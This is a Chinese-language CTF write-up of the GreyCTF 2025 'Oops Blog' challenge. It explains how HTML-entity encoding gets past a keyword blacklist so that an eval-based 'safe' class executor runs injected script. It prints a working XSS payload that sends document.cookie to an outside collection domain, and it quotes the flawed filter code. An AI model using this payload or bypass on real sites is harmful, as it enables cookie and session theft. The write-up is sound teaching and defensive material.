# GreyCTF 2025 Oops Blog Writeup

## 题目简述

博客把用户 Markdown 在浏览器中交给 Showdown 转换，并设置了严格 CSP。页面还加载同源 `safe.js`：MutationObserver 会寻找新增的 `.safe` 元素，并对其文本执行 `eval`。为了阻止用户制造这种元素，模板在 Markdown 解析前检查 `safe`、HTML 元字符及多个 JavaScript 关键字。

漏洞在于黑名单检查发生在 HTML 实体解码之前。用实体写出代码块语言名，原始正文中没有 `safe`，但 Markdown 解析器生成 DOM 时会还原成 `class="safe"`，从而进入受信任执行器。

## 解题过程

页面先做：

```javascript
let body = atob(encodedBody).toLowerCase();
if (["safe", ">", "<", "=", "\"", "'", "`", "$", "{", "}", "!", "+",
     "set", "eval", "exec", "new", "const"].some(x => body.includes(x))) {
  body = "Malicious content detected!";
}
output_post.innerHTML = converter.makeHtml(body);
```

可以提交如下 Markdown：

```text
~~~&#x73;&#x61;&#x66;&#x65;
window.open([location.hash,atob(btoa(/h.jro.sg/)),document.cookie].join(atob(btoa(/h/))[0]))
~~~
```

`&#x73;&#x61;&#x66;&#x65;` 在过滤阶段不含字面量 `safe`，进入 HTML 后才被解码。Showdown 生成带 `safe` 类的代码块，MutationObserver 随即 `eval` 其中的文本。脚本本身避免了黑名单中的引号、反引号、加号和 `new` 等字符串；`atob(btoa(/h/))[0]` 产生 `/`，数组拼接得到指向收集域名的协议相对 URL，并把 `document.cookie` 放入路径。

将帖子短码提交给 `/report` 后，管理员机器人会先设置非 HttpOnly 的 `admin_flag` cookie，再访问帖子。外部请求中即可收到当前实例的动态 flag：

```text
grey{html_encoding_bypasses_filters_<post_id>_<hmac>}
```

其中 `<post_id>` 是六位帖子短码，`<hmac>` 是机器人用服务端密钥计算并截断为十个十六进制字符的 HMAC，因此不同帖子得到的尾部不同。

## 方法总结

本题的核心是过滤与解释之间存在编码层差异：过滤器检查原始 Markdown，Showdown 和浏览器随后才进行实体解码与 DOM 构造。CSP 并未阻止利用，因为站点自己的 `safe.js` 已被允许加载，且策略包含 `'unsafe-eval'`；攻击者只需把内容送进这个同源执行器。修复应删除基于类名的 `eval`，对 Markdown 输出使用成熟的 HTML sanitizer，并避免依赖关键字黑名单。
